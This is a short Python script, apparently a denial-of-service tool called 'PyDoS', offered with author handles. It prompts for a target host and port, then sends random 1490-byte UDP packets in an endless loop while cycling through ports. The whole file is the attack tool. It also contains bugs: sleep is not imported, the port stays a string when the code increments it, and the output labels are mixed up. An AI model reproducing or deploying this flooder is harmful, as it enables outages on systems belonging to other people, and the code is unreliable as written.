#Made by atomic#7157
#GHXTEAM


import sys
import os
import time
import socket
import random

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#LOLSHIT
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)



print
print ("PyDoS - @Atom1cLhu")
print ("Github : https://github.com/atom1clhu")
print ("Discord : atomic#7175")

sleep(1)
print("Target Hostname/IP")
ip = input("Hostname/IP : ")
port = input("Port : ")
print
print("Please wait...")
time.sleep(2)

print ("Targeting...")
print ("Starting in 1 seconds...")
time.sleep(1)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print ("Sending requests to target \033[31;1m%s \033[32;1mwith IP \033[33;1m%s  \033[32;1mwith bytes \033[34;1m%s"%(sent,ip,port))
     if port == 65534:
       port = 1
